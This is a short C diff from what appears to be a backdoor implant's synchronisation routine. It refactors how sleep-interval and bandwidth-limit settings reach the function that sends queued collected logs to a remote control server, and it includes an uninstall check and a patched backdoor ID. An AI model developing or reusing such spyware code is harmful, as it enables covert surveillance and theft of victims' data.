@@ -70,6 +70,9 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param)
 	DWORD ret_val; 
 	BOOL conn_error = FALSE;
 	BOOL exit_after_completion;
+	DWORD min_sleep;
+	DWORD max_sleep;
+	DWORD band_limit;
 
 	char *asp_server, *unique_id;
 	BOOL uninstall;
@@ -89,6 +92,9 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param)
 	asp_server = sync_conf->asp_server;
 	unique_id = (char *)bin_patched_backdoor_id;
 	exit_after_completion = sync_conf->exit_after_completion;
+	min_sleep = sync_conf->min_sleep;
+	max_sleep = sync_conf->max_sleep;
+	band_limit = sync_conf->band_limit;
 
 	// Quando riceve l'uninstall la funzione ritorna comunque FALSE
 	if (!LOG_StartLogConnection(asp_server, unique_id, &uninstall, &actual_time, availables, sizeof(availables))) {
@@ -150,7 +156,7 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param)
 
 	// Invia la coda dei log da spedire (no concorrenza con agenti)
 	// Essendo l'ultima parte del protocollo, questa funzione si occupera' anche di mandare i PROTO_BYE
-	LOG_SendLogQueue(sync_conf->band_limit, sync_conf->min_sleep, sync_conf->max_sleep);
+	LOG_SendLogQueue(band_limit, min_sleep, max_sleep);
 	LOG_CloseLogConnection();
 
 	if (new_conf)
